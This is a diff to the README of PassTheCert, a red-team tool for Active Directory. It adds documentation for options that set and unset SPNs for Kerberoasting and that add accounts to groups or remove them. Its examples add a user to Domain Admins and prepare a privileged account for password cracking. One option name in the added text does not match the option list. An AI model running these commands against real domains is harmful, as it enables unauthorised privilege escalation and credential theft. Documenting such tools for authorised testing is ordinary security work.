@@ -36,12 +36,18 @@ ATTACK TYPE:
                 Elevate the rights of a user on the domain. Will grant DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights.
         --rbcd
                 Adds an SID to the msDS-AllowedToActOnBehalfOfOtherIdentity arttribute of the target.
+        --set-spn
+                Adds a SPN to the given target account to allow you to request a TGS for the user (Kerberoasting)
+        --unset-spn
+                Remove a SPN from the given target account after you have requested the TGS
         --add-computer
                 Add a new computer to the domain (useful for RBCD attacks).
         --reset-password
                 Reset the password of the targeted account (requires the User-Force-Change-Password right).
-        --toggle-enabled
-                Toggle a user account from disabled to enabled, or enabled to disabled.
+        --add-account-to-group
+                Add an account to the given group.
+        --remove-account-from-group
+                Remove an account from the given group.
 
 ```
 
@@ -231,6 +237,18 @@ Here's an example of usage:
 C:\> .\PassTheCert.exe --server srv-ad.contoso.com --cert-path Z:\skywalker.pfx --add-account-to-group --target "CN=Domain Admins,CN=Users,DC=contoso,DC=com" --account "CN=simple_user,CN=Users,DC=contoso,DC=com"
 Success
 ```
+Also supported: `--remove-user-from-group to` cleanup
+
+### Set SPN to Kerberoast
+
+If an account doesnt have a SPN set (a pre-requisite to perform a Kerberoasting attack), we can use a sufficiently privileged certificate to add a SPN to an account, and then Kerberoast the account to attempt to recover the password. 
+
+```console
+C:\> .\PassTheCert.exe --server srv-ad.contoso.com --cert-path Z:\skywalker.pfx --set-spn --target "host/server" --account "CN=privileged_user,CN=Users,DC=contoso,DC=com"
+Success
+```
+
+After you request the ticket, you can cleanup with `--unset-spn`
 
 ### Toggle AD user account enabled/disabled
 
